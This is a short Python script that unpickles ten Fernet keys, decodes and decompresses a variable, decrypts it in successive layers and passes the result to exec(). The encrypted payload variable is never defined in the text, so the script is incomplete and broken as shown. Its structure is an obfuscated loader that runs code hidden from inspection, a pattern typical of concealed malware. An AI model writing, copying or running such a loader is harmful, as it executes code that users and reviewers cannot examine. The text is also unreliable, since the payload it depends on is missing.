import zlib, base64, pickle
from cryptography.fernet import Fernet
import time
boyzgamesENC = b'\x80\x04\x95\xdb\x01\x00\x00\x00\x00\x00\x00]\x94(C,NY2Q2xv54Dbutx_eEM4ixW2pxOSFMZuHFtIejWVsscM=\x94C,ymcbx2eFwidslMCW_4NWdmw88Lc92cmVLezeskj8TH8=\x94C,vpFw_vO9mfd5MWy2cPo0TMOanZJJawftGSMkZuzAoYY=\x94C,mcQ12VV1LEJUpgBHjOwrTKk878RwIJJkfX8aYfl9hfc=\x94C,pY_59JWGw3hya-l3wBXlTCsPjZLsvbcQbN0sK1PGGCM=\x94C,EAcilEbDtWli_CTHy--kDpgC4FombwwDPZVxNGxB0LA=\x94C,imXQJxutZqz1taJdZeVMTjK11JJR50GyvaXGFbBBYcY=\x94C,j3uMJsgcUz0MwJ-aiKLqmnpGexO40EnUnSDgO5ZX3co=\x94C,LAEatw5SnlJ07YWQ7WvhKDjNDnwagU2VKfQdniPZlkY=\x94C,hVIa-h29JmbI7MRTIPlcEodRpRltCf87N6AL1mUr64E=\x94e.'
boyzgamesENC = pickle.loads(boyzgamesENC)
boyzgamesDEV = base64.b64decode(boyzgamesDEV) 
boyzgamesDEV = zlib.decompress(boyzgamesDEV)
for BOYZGAMESYT in reversed(boyzgamesENC):
    BOYZGAMESVIP = Fernet(BOYZGAMESYT)
    boyzgamesDEV = BOYZGAMESVIP.decrypt(boyzgamesDEV)
exec(boyzgamesDEV)